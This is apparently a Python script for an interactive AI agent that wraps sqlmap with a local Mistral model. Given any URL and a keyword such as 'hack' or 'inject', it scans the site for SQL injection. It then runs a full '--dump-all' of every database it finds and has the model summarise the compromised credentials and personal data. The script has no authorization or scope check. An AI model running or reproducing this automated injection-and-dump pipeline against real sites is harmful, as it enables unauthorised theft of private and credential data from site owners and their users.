import warnings
import re
import subprocess
import os
import sys
import time
from langchain_ollama import OllamaLLM
from typing import Dict, List, Optional

warnings.filterwarnings("ignore")
os.environ["PYTHONWARNINGS"] = "ignore"

MODEL_NAME = "mistral"
SQLMAP_PATH = "sqlmap"

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    GRAY = '\033[90m'

class SecurityAgent:
    def __init__(self, model_name: str = MODEL_NAME):
        print(f"{Colors.GREEN}[System] Initializing Agent...{Colors.END}")
        try:
            self.llm = OllamaLLM(model=model_name)
            print(f"{Colors.GREEN}[System] Agent Ready.{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[Error] LLM Initialization failed: {e}{Colors.END}")

    def print_log(self, source: str, message: str, color: str = Colors.END):
        timestamp = time.strftime("%H:%M:%S")
        print(f"{Colors.GRAY}[{timestamp}]{Colors.END} {Colors.BOLD}[{source}]{Colors.END} {color}{message}{Colors.END}")

    def extract_url(self, prompt: str) -> Optional[str]:
        url_pattern = r'https?://[^\s<>"]+|www\.[^\s<>"]+'
        match = re.search(url_pattern, prompt)
        return match.group(0) if match else None
    
    def run_sqlmap_raw(self, command: List[str]) -> str:
        try:
            cmd = command + ["--batch", "--disable-coloring", "--purge"]
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=900,
                shell=False
            )
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Error: Command timed out."
        except Exception as e:
            return f"Error: {str(e)}"

    def extract_databases(self, output: str) -> List[str]:
        databases = []
        lines = output.split('\n')
        in_db_section = False
        
        for line in lines:
            line = line.strip()
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            
            if in_db_section and '[*]' in line:
                parts = line.split('[*]')
                if len(parts) > 1:
                    db_name = parts[1].strip()
                    if db_name and db_name not in ['information_schema', 'mysql', 'sys', 'performance_schema']:
                        databases.append(db_name)
            
            if in_db_section and '---' in line and len(databases) > 0:
                break
        
        return list(set(databases))

    def analyze_dump_data(self, database: str, raw_data: str):
        self.print_log("AI", f"Analyzing dumped data from '{database}'...", Colors.CYAN)
        
        prompt = (
            f"You are a cybersecurity analyst. I have dumped data from a SQL database named '{database}'. "
            f"Here is a snippet of the raw output from the tool:\n\n"
            f"{raw_data[:8000]}\n\n"
            f"Please analyze this output concisely. Identify the table names and explain what kind of data was compromised "
            f"(e.g., user credentials, personal info, system config). Do not list every row, just summarize the data types found."
        )
        
        try:
            response = self.llm.invoke(prompt).strip()
            print(f"\n{Colors.BLUE}[AI Analysis Report for {database}]{Colors.END}")
            print(f"{Colors.CYAN}{response}{Colors.END}\n")
        except Exception as e:
            self.print_log("Error", f"AI Analysis failed: {e}", Colors.RED)

    def perform_audit(self, url: str):
        self.print_log("Agent", f"Target identified: {url}", Colors.BLUE)
        self.print_log("Agent", "Scanning for SQL Injection vulnerabilities...", Colors.CYAN)
        
        cmd_dbs = [SQLMAP_PATH, "-u", url, "--dbs", "--level=2", "--risk=2"]
        output_dbs = self.run_sqlmap_raw(cmd_dbs)
        
        databases = self.extract_databases(output_dbs)
        
        if not databases:
            self.print_log("Result", "No databases found or target is not vulnerable.", Colors.YELLOW)
            return

        self.print_log("Result", "Vulnerability Confirmed.", Colors.GREEN)
        self.print_log("Result", f"Total Databases Found: {len(databases)}", Colors.GREEN)
        
        print(f"\n{Colors.HEADER}--- Discovered Databases ---{Colors.END}")
        for db in databases:
            print(f"- {db}")
        print(f"{Colors.HEADER}----------------------------{Colors.END}\n")

        for db in databases:
            self.print_log("Agent", f"Extracting ALL data from database: {db}", Colors.CYAN)
            self.print_log("Agent", "This process involves a full dump and may take time...", Colors.GRAY)
            
            cmd_dump = [SQLMAP_PATH, "-u", url, "-D", db, "--tables", "--dump-all"]
            output_dump = self.run_sqlmap_raw(cmd_dump)
            
            if "fetched" in output_dump or "entries" in output_dump:
                self.print_log("Result", f"Data extraction successful for '{db}'", Colors.GREEN)
                self.analyze_dump_data(db, output_dump)
            else:
                self.print_log("Result", f"Could not extract meaningful data from '{db}' or permission denied.", Colors.YELLOW)

        self.print_log("System", "Audit task completed.", Colors.GREEN)

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    agent = SecurityAgent()
    
    print(f"\n{Colors.GRAY}System ready. Awaiting instructions...{Colors.END}")
    
    while True:
        try:
            user_input = input(f"\n{Colors.BOLD}User >{Colors.END} ").strip()
            
            if not user_input:
                continue
                
            if user_input.lower() in ["exit", "quit"]:
                print(f"{Colors.RED}[System] Shutting down.{Colors.END}")
                break
            
            if any(k in user_input.lower() for k in ['sql', 'inject', 'scan', 'test', 'hack', 'check']):
                url = agent.extract_url(user_input)
                if url:
                    agent.perform_audit(url)
                else:
                    print(f"{Colors.YELLOW}[Agent] I need a valid URL to proceed with the scan.{Colors.END}")
            else:
                print(f"{Colors.CYAN}[Agent] Processing query...{Colors.END}")
                response = agent.llm.invoke(user_input).strip()
                print(f"{Colors.CYAN}[Agent]{Colors.END} {response}")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[System] Interrupted.{Colors.END}")
            break
        except Exception as e:
            print(f"{Colors.RED}[Error] {str(e)}{Colors.END}")

if __name__ == "__main__":
    main()